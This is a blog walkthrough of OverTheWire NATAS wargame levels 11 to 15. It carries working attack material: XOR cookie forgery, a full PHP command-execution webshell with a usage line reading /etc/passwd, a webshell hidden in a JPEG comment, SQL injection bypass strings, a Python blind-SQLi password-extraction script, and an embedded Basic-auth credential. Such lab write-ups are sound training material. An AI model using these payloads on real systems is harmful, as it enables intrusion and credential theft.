---
title: 'OverTheWire: NATAS 11 &#8211; 15'
date: 2019-09-12T12:03:00-04:00
categories: [Walkthrough, OverTheWire]
tags: [web]
---
### LEVEL 11

<img class="alignnone size-full wp-image-221" src="/assets/img/2019/09/2019-09-11_13h57_52.png" /> 

PHP sourcecode:

{% highlight php %}
<?
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
?>

<form>
Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
<input type=submit value="Set color">
</form>
{% endhighlight %}

#### Attempt 1.

Since there&#8217;s an input box here that can set the &#8220;bgcolor&#8221; variable, we probably have to use that somehow to inject the values we want.

Maybe we can break the JSON with a quotation character and inject another &#8220;showpassword&#8221; value. Typing it into the form field should look like <span class="lang:php highlight:0 decode:true crayon-inline">&#8220;,&#8221;showpassword&#8221;:&#8221;yes&#8221;</span> .

However, that didn&#8217;t work, thanks to the character filter `preg_match(‘/^#(?:[a-f\d]{6})$/i’, $_REQUEST[‘bgcolor’])` . Back to the drawing board&#8230;

#### Attempt 2

The bottom part of the sourcecode suggests that if we get the $data (which is a JSON array saved in a cookie) variable &#8220;showpassword&#8221; to be &#8220;yes&#8221;, then we will get the next password. And the line `$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[“data”])), true);` shows that our cookie is json encoded, then xor_encrypted, then base64 encoded.

To inject the &#8220;showpassword&#8221; value, we will need to recreate all these things and save it in the &#8220;data&#8221; cookie.

The JSON format for the values needed is:


`{“showpassword”:”yes”,”bgcolor”:”#ffffff”}`
  

For the XOR encryption, I did a quick Google search and found a <a href="http://code.activestate.com/recipes/266586-simple-xor-keyword-encryption/">python script</a> I can use for this. I modified it a little to work with arguments passed to it instead of hardcoded values.

When putting it all together with the <strong>current level&#8217;s password </strong>as the XOR key, it did NOTHING when I set that as the cookie. So that&#8217;s not the key, we need to figure out what it is.

XOR isn&#8217;t a particularly good method of encryption, and very vulnerable to a known plaintext attack. We can probably get the key out since we know what data should decrypt to: `{“showpassword”:”no”,”bgcolor”:”#ffffff”}`

The cookie data value is &#8220;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&#8221; , so we would just XOR that with the JSON code above and hopefully get a good result.

The code I used for the decryption is (based on <a href="https://gist.github.com/revolunet/2412240">this script</a>):
  
{% highlight python %}
#!/usr/bin/python
# NB : this is not secure
# from http://code.activestate.com/recipes/266586-simple-xor-keyword-encryption/
# added base64 encoding for simple querystring :)
#
import sys
import base64
from itertools import izip, cycle

def xor_crypt_string(data, key='awesomepassword', encode=True, decode=True):
    if decode:
        data = base64.decodestring(data)
    xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, cycle(key)))
    if encode:
        return base64.encodestring(xored).strip()
    return xored


if __name__ == '__main__':
	result = xor_crypt_string('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=', '{"showpassword":"no","bgcolor":"#ffffff"}', False, True)
	print(result)
{% endhighlight %}
  
The output is &#8220;qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq&#8221; which is clearly a good result! That means the key is &#8220;qw8J&#8221;! Now that we have the key, it can be used to make a new cookie with the values we want.

String to encrypt should be: `{“showpassword”:”yes”,”bgcolor”:”#ffffff”}`, with the key &#8220;qw8J&#8221;. Change the script above to use these values and presto!

&#8220;ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK&#8221; is the output, just put that in the cookie with Burp and you&#8217;ll have the password!

&nbsp;

### LEVEL 12

<img class="alignnone size-full wp-image-223" src="/assets/img/2019/09/2019-09-12_11h53_28.png" /> 

Sourcecode PHP:

{% highlight php %}
<?
function genRandomString() {
  $length = 10;
  $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
  $string = "";  

  for ($p = 0; $p < $length; $p++) {
    $string .= $characters[mt_rand(0, strlen($characters)-1)];
  }

  return $string;
}

function makeRandomPath($dir, $ext) {
  do {
  $path = $dir."/".genRandomString().".".$ext;
  } while(file_exists($path));
  return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
  $ext = pathinfo($fn, PATHINFO_EXTENSION);
  return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
  $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


  if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
    echo "File is too big";
  } else {
    if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
      echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
    } else{
      echo "There was an error uploading the file, please try again!";
    }
  }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?>
{% endhighlight %}

#### Attempt 1

This level has a file upload, so there&#8217;s a couple of probable ways this could be vulnerable. It could be possible to upload a PHP webshell depending on what it does with the file after it&#8217;s uploaded. Or it could be vulnerable to directory traversal in the filename. On looking into the sourcecode, it kind of looks like it will be a vulnerability with the filename. It looks like part of the filename will be randomized, but the extension will be preserved.

I made a very small JPEG file since the max is only 1KB, and first tested it on the site to make sure it would go through.

<img class="alignnone size-full wp-image-230" src="/assets/img/2019/09/2019-09-13_09h18_19.png" /> 

So it does randomize the name but preserve the extension. If I put in &#8220;/../&#8221; into the extension, maybe I can go up a directory. My system gave me a warning that files can&#8217;t be named with &#8220;/&#8221; in it, so maybe I can use URL encoding to get around that. I am able to save a filename that way, but the page doesn&#8217;t care, it replaces my filename completely and appends a &#8220;.jpg&#8221; as the extension with `<input type=”hidden” name=”filename” value=”.jpg” />`.

#### Attempt 2

Instead of directly using the filename, we can use Burp to send it whatever we want in the form. Some experimentation shows that it does preserve the extension when put into the form with Burp.

<img class="alignnone wp-image-234 size-full" src="/assets/img/2019/09/2019-09-13_09h38_21-1.png" /> 

I confirmed the vulnerability does allow me to load a PHP file. Since a link to the file is returned, it&#8217;s almost certain to allow me to use a webshell.

Here is the webshell I used:

{% highlight php %}
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
<!--    http://michaeldaw.org   2006    -->
{% endhighlight %}

And this command gave the password: `http://natas12.natas.labs.overthewire.org/upload/2hqri8g7u3.php?cmd=cat+/etc/natas_webpass/natas13`

&nbsp;

### LEVEL 13

<img class="alignnone size-full wp-image-235" src="/assets/img/2019/09/2019-09-13_10h09_37.png" /> 

Uploading the same PHP file as last time gives an error:

<img class="alignnone size-full wp-image-236" src="/assets/img/2019/09/2019-09-13_10h10_15.png" /> 

So there&#8217;s a check on the file contents itself. We can probably add just the &#8220;magic bytes&#8221; at the beginning of the file to make it look like a JPEG. Or hide PHP code within the EXIF data of a legitimate JPEG file.

Using some tools on my Kali box, I wrote the PHP webshell into the comment section of a JPEG file:

`wrjpgcom -cfile phpupload upload.jpg > test.jpg`

After I uploaded it with the form, I used Burp to modify the form submission to change the extension (like the last level) to php. The results:

<img class="alignnone size-full wp-image-237" src="/assets/img/2019/09/2019-09-13_10h36_40.png" /> 

&nbsp;

### LEVEL 14

<img class="alignnone size-full wp-image-238" src="/assets/img/2019/09/2019-09-13_10h49_40.png" /> 

This level is a common user authentication form. Let&#8217;s see the sourcecode.

{% highlight php %}
<?
if(array_key_exists("username", $_REQUEST)) {
  $link = mysql_connect('localhost', 'natas14', '<censored>');
  mysql_select_db('natas14', $link);
  
  $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
  if(array_key_exists("debug", $_GET)) {
    echo "Executing query: $query<br>";
  }

  if(mysql_num_rows(mysql_query($query, $link)) > 0) {
      echo "Successful login! The password for natas15 is <censored><br>";
  } else {
      echo "Access denied!<br>";
  }
  mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<? } ?>
{% endhighlight %}

There is a simple SQL Injection vulnerability since the input has no filters or checks on it. Sending a double quote character will break the SQL and prove the vulnerability:

<img class="alignnone size-full wp-image-239" src="/assets/img/2019/09/2019-09-13_10h54_10.png" /> 

A simple SQLi statement should get us in, we don&#8217;t even need to put anything in the password field if we comment out the rest of the query. The most basic statement is `“or 1=1 —- ` but it only works if there&#8217;s a trailing space. I suppose that&#8217;s so the query sees the comment mark &#8216;&#8211;&#8216; instead of &#8216;&#8211;\&#8221;&#8216;. Alternatively, you could probably use the other comment character &#8220;#&#8221;.

<img class="alignnone size-full wp-image-240" src="/assets/img/2019/09/2019-09-13_11h00_23.png" /> 

&nbsp;

### LEVEL 15

<img class="alignnone size-full wp-image-241" src="/assets/img/2019/09/2019-09-13_11h03_14.png" /> 

And the sourcecode:

{% highlight php %}
<?
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
  $link = mysql_connect('localhost', 'natas15', '<censored>');
  mysql_select_db('natas15', $link);
  
  $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
  if(array_key_exists("debug", $_GET)) {
    echo "Executing query: $query<br>";
  }

  $res = mysql_query($query, $link);
  if($res) {
  if(mysql_num_rows($res) > 0) {
    echo "This user exists.<br>";
  } else {
    echo "This user doesn't exist.<br>";
  }
  } else {
    echo "Error in query.<br>";
  }

  mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<? } ?>
{% endhighlight %}

It looks like another SQL Injection just like the previous level. Let&#8217;s try a basic SQLi statement like before:

`"or 1=1 -- `

<img class="alignnone size-full wp-image-242" src="/assets/img/2019/09/2019-09-13_11h05_51.png" /> 

So it&#8217;s proven to be vulnerable, now we need to exploit it to get the password out. I checked that natas16 is a user, so we need to pull the password out of that record specifically.

The script only shows a few different possible outputs, depending on the state of the result, suppressing any error messages. So this is a Blind SQL Injection and requires more patience to exploit.

Best way that I know of is to validate each character of the password with the output states &#8220;This user exists&#8221; or &#8220;This user doesn&#8217;t exist&#8221;. Since doing this by hand will take forever and a day, a python script is how I chose to do it. Here is my code to get the password:

{% highlight python %}
#!/usr/bin/python3
#
# main execution script for solving natas15 on OverTheWire.org

import requests

# All possible characters
allChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
# Characters used
usedChars = ''
# Final Password
password = ''
# Our target URL
target = "http://natas15.natas.labs.overthewire.org"
headers = {
  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101',
  'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==',
}


def send_query(query):
  payload = {'username': query}
  print("Payload: " + str(payload))
  response = requests.post(target + '/index.php?', data=payload, headers=headers)
  return response


r = requests.get(target, headers=headers)
if r.status_code != requests.codes.ok:
  raise ValueError('Couldn\'t connect to target :(')
else:
  print('Target reachable. Starting character parsing...')

# Get list of characters used so we don't have to iterate unnecessarily
print("Getting list of characters used...")
for c in allChars:
  print("Trying Character: " + c)
  resp = send_query('natas16" and password like "%s%s%s" #' % ("%", c, "%"))
  if 'exists' in str(resp.content):
    usedChars += c
    print("Character found: " + c)
print("Characters used: " + usedChars)

# Retrieve the password one char at a time
for i in range(1, 33):
  print("Testing password...")
  for c in usedChars:
    print("Trying Character: " + c)
    print("Password so far: " + password)
    resp = send_query('natas16" and ascii(substring((select password from users where username="natas16"),%d,1))=%s #' % (i, ord(c)))
    if 'exists' in str(resp.content):
      password += c
      break

print('Password: ' + password)
{% endhighlight %}